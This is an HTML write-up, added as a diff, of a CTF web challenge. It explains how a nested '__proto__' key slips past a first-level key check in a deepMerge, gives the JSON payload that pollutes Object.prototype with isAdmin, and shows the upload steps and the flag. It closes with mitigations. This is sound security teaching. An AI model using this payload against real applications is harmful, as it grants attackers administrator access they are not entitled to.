@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Writeup - theme-generator Challenge</title>
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #e0e0e0;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #1a1a1a;
+        }
+        header {
+            background-color: #121212;
+            color: white;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            border-left: 4px solid #0d7377;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 2.2em;
+            color: #0d7377;
+        }
+        .challenge-info {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-top: 15px;
+        }
+        .challenge-info div {
+            background-color: #222;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+        }
+        .container {
+            background-color: #222;
+            padding: 30px;
+            border-radius: 5px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #0d7377;
+            border-bottom: 2px solid #333;
+            padding-bottom: 10px;
+        }
+        h3 {
+            color: #14ffec;
+            margin-top: 25px;
+        }
+        pre {
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 15px 0;
+            padding: 0;
+        }
+        code {
+            font-family: 'Consolas', 'Monaco', monospace;
+            border-radius: 5px;
+        }
+        .description {
+            background-color: #2a2a2a;
+            border-left: 4px solid #0d7377;
+            padding: 10px 20px;
+            margin: 20px 0;
+        }
+        .flag {
+            background-color: #1c3b1c;
+            color: #00ff7f;
+            padding: 10px 20px;
+            border-left: 4px solid #00ff7f;
+            margin: 20px 0;
+            font-weight: bold;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+        .step {
+            margin-bottom: 30px;
+        }
+        .step-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #14ffec;
+        }
+        ul {
+            padding-left: 20px;
+        }
+        ul li {
+            margin-bottom: 8px;
+        }
+        .references a {
+            color: #14ffec;
+            text-decoration: none;
+        }
+        .references a:hover {
+            text-decoration: underline;
+            color: #0d7377;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #777;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #444;
+            border-radius: 4px;
+            padding: 5px;
+            margin: 10px 0;
+        }
+        .command {
+            background-color: #151515;
+            color: #14ffec;
+            padding: 10px 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            border-left: 4px solid #0d7377;
+        }
+        .output {
+            background-color: #1a1a1a;
+            padding: 10px 15px;
+            border-radius: 5px;
+            border-left: 4px solid #444;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            color: #ddd;
+        }
+        .highlight-section {
+            background-color: #1a1a1a;
+            border-left: 4px solid #14ffec;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        a {
+            color: #14ffec;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .emoji {
+            font-size: 1.2em;
+            margin-right: 5px;
+        }
+        .key-point {
+            border-left: 3px solid #ff7e67;
+            padding-left: 15px;
+            margin: 15px 0;
+            background-color: rgba(255, 126, 103, 0.1);
+        }
+        .vulnerability {
+            background-color: #3d1a1a;
+            border-left: 4px solid #ff6b6b;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .code-analysis {
+            background-color: #2a2a1a;
+            border-left: 4px solid #ffd700;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .payload-section {
+            background-color: #1a1a3d;
+            border-left: 4px solid #9b59b6;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .technical-explanation {
+            background-color: #1a2a2a;
+            border-left: 4px solid #00bcd4;
+            padding: 15px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>🌈 Challenge: theme-generator</h1>
+        <div class="challenge-info">
+            <div>🏆 CTF@AC</div>
+            <div>📢 Category: Web</div>
+            <div>💯 Points: 100</div>
+            <div>📊 Solves: 56</div>
+            <div>👤 Author: thek0der</div>
+            <div>👤 Solver: ArghgrA/CuboConNoveQuadrati</div>
+        </div>
+    </header>
+    <div class="container">
+        <h2>📝 Challenge Description</h2>
+        <div class="description">
+            <p><strong>"Just a simple theme generator app. Nothing fancy."</strong></p>
+            <p>Despite the innocent description, this web application contains a critical prototype pollution vulnerability that allows privilege escalation from guest user to administrator through a maliciously crafted JSON upload.</p>
+        </div>
+        <p><strong>📁 Files:</strong> Handout.zip</p>
+        <p><strong>🌐 Server:</strong> http://ctf.ac.upt.ro:9696</p>
+        <p><strong>🔑 Default Credentials:</strong> guest / guest</p>
+    </div>
+    <div class="container">
+        <h2>📈 Summary</h2>
+        <p>An authenticated user (guest / guest) can obtain administrator privileges by uploading a specially crafted JSON file via POST /api/preset/upload. The security check in the script only blocks dangerous keys at the first level but not nested ones. Since the merge function (deepMerge) recursively combines the uploaded JSON with the default preset without protecting <strong>__proto__</strong> / constructor / prototype, it's possible to inject <code>isAdmin: true</code> into the global prototype (Object.prototype) and make requireAdmin consider the user as an admin.</p>
+    </div>
+    <div class="container">
+        <h2>🚨 Vulnerability Analysis</h2>
+        <div class="vulnerability">
+            <h3>🔓 Vulnerability Type</h3>
+            <ul>
+                <li><strong>Type:</strong> Prototype Pollution </li>
+                <li><strong>Vulnerable endpoint:</strong> POST /api/preset/upload</li>
+                <li><strong>Requirements:</strong> Authentication (default credentials: guest / guest) and ability to upload JSON files up to 50 KB</li>
+            </ul>
+        </div>
+        <div class="step">
+            <h3>🔍 Code Analysis</h3>
+            <p>The vulnerable code performs a security check only on first-level keys of the uploaded data object:</p>
+            <div class="code-analysis">
+                <pre><code class="language-javascript">for (const k of Object.keys(data)) {
+  if (["__proto__", "prototype", "constructor"].includes(k)) {
+    return res.status(400).send('blocked');
+  }
+}</code></pre>
+                <p><strong>Critical Flaw:</strong> This check doesn't intercept dangerous keys nested deeper (e.g., <code>data.theme.__proto__</code>).</p>
+            </div>
+            <p>After the check, the code executes:</p>
+            <pre><code class="language-javascript">const merged = deepMerge({}, DEFAULT_PRESET);
+deepMerge(merged, data);</code></pre>
+            <div class="key-point">
+                <p>⚠️ <strong>Security Issue:</strong> If deepMerge doesn't explicitly protect __proto__/constructor/prototype during recursive merging, the assignment can set properties on the global prototype, causing pollution.</p>
+            </div>
+        </div>
+    </div>
+    <div class="container">
+        <h2>🧠 Technical Explanation</h2>
+        <div class="technical-explanation">
+            <h4>💡 Why the Payload Works</h4>
+            <p>When a recursive merge assigns the <strong>__proto__</strong> property of an object, it can alter Object.prototype.<br>By injecting <code>isAdmin: true</code> into the prototype</p>
+            <p><strong>Result:</strong> A guest user without privileges can acquire administrative rights through prototype pollution.</p>
+        </div>
+    </div>
+    <div class="container">
+        <h2>🛠️ Exploitation Process</h2>
+        <div class="step">
+            <h3>🔑 Step 1: Authentication</h3>
+            <p>First, authenticate to the application using the default credentials:</p>
+            <div class="command">
+                Username: guest<br>
+                Password: guest
+            </div>
+            <p>This provides access to the theme upload functionality.</p>
+        </div>
+        <div class="step">
+            <h3>💣 Step 2: Payload Creation</h3>
+            <p>Create a malicious JSON file that exploits the nested prototype pollution vulnerability:</p>
+            <div class="payload-section">
+                <h4>🎯 Exploit Payload (exploit.json)</h4>
+                <pre><code class="language-json">{
+  "theme": {
+    "__proto__": {
+      "isAdmin": true
+    }
+  }
+}</code></pre>
+                <p><strong>Why this works:</strong> The payload bypasses the Object.keys(data) check because the dangerous key is not at the first level but nested within the theme object.</p>
+            </div>
+        </div>
+        <div class="step">
+            <h3>📤 Step 3: Payload Upload</h3>
+            <p>Upload the malicious JSON file through the preset upload endpoint:</p>
+            <div class="command">
+                POST /api/preset/upload<br>
+                Content-Type: multipart/form-data<br>
+                File: exploit.json
+            </div>
+            <p>The server will process the file and merge it with the default preset, triggering the prototype pollution.</p>
+        </div>
+        <div class="step">
+            <h3>👑 Step 4: Privilege Escalation</h3>
+            <p>After the upload, the prototype pollution takes effect. Any subsequent requests will treat the guest user as an administrator due to the polluted Object.prototype.</p>
+            <div class="output">
+                → Object.prototype.isAdmin = true<br>
+                → req.user.isAdmin evaluates to true<br>
+                → Admin privileges granted to guest user
+            </div>
+        </div>
+    </div>
+    <div class="container">
+        <h2>🎯 Post-Exploitation State</h2>
+        <div class="step">
+            <h3>📊 Preset Structure After Upload</h3>
+            <p>After uploading exploit.json, the preset object structure on the server appears as:</p>
+            <pre><code class="language-json">{
+  "theme": {
+    "name": "light",
+    "colors": {
+      "bg": "#fff",
+      "fg": "#111"
+    },
+    "__proto__": {
+      "isAdmin": true
+    }
+  },
+  "options": {
+    "compact": false
+  }
+}</code></pre>
+            <div class="highlight-section">
+                <p>🔍 <strong>Key Observation:</strong> While the __proto__ appears as a regular property in the serialized object, its assignment during the merge process has already polluted the global Object.prototype.</p>
+            </div>
+        </div>
+    </div>
+    <div class="container">
+        <h2>🏆 Flag Extraction</h2>
+        <p>With administrator privileges obtained through prototype pollution, access to admin-only "/admin/flag" functionality reveals the flag:</p>
+        <div class="flag">
+            ctf{fa82311c2970593b2df929b7d0f1ca6292a9a2d3707057b84a5127ceed38edd6}
+        </div>
+    </div>
+    <div class="container">
+        <h2>📚 Lessons Learned</h2>
+        <ul>
+            <li><strong>Prototype Pollution:</strong> Shallow validation of dangerous keys is insufficient - nested keys can still cause pollution</li>
+            <li><strong>Object Merging:</strong> Deep merge operations must explicitly handle prototype-related properties</li>
+            <li><strong>Privilege Escalation:</strong> Prototype pollution can have severe security implications beyond just property modification</li>
+            <li><strong>Input Validation:</strong> Security checks must be comprehensive and consider nested object structures</li>
+            <li><strong>Default Credentials:</strong> Always change default login credentials in production applications</li>
+            <li><strong>JavaScript Security:</strong> Understanding JavaScript's prototype chain is crucial for web security</li>
+        </ul>
+    </div>
+    <div class="container">
+        <h2>🛡️ Mitigation Strategies</h2>
+        <div class="technical-explanation">
+            <h4>🔒 Recommended Fixes</h4>
+            <ul>
+                <li><strong>Recursive Key Validation:</strong> Check for dangerous keys at all levels of nested objects</li>
+                <li><strong>Safe Merge Implementation:</strong> Use libraries that explicitly handle prototype pollution (e.g., lodash with proper configuration)</li>
+                <li><strong>JSON Schema Validation:</strong> Implement strict schema validation for uploaded JSON files</li>
+                <li><strong>Principle of Least Privilege:</strong> Avoid relying on prototype chain for security decisions</li>
+                <li><strong>Object.create(null):</strong> Use prototype-less objects for sensitive operations</li>
+            </ul>
+        </div>
+    </div>
+    <div class="container references">
+        <h2>🔗 References</h2>
+        <ul>
+            <li><a href="https://portswigger.net/web-security/prototype-pollution">PortSwigger: Prototype Pollution</a></li>
+            <li><a href="https://owasp.org/www-community/vulnerabilities/Prototype_Pollution">OWASP: Prototype Pollution</a></li>
+        </ul>
+    </div>
+    <div class="footer">
+        <p>🏆 © 2025 - Writeup created by ArghgrA/CuboConNoveQuadrati | Happy hacking! 🔍</p>
+    </div>
+</body>
+</html>
